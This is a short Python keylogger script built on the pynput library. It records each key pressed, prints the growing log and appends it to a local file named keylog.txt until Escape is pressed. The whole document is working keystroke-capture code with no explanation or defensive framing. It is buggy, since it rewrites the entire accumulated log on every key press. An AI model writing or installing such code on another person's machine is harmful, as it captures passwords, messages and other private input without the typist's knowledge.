import pynput.keyboard

log = ""

def process_key_press(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == pynput.keyboard.Key.space:
            log = log + " "
        else:
            log = log + " " + str(key) + " "

    print(log)

    with open("keylog.txt", "a") as f:
        f.write(log)

def process_key_release(key):
    if key == pynput.keyboard.Key.esc:
        return False

keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press, on_release=process_key_release)

with keyboard_listener:
    keyboard_listener.join()
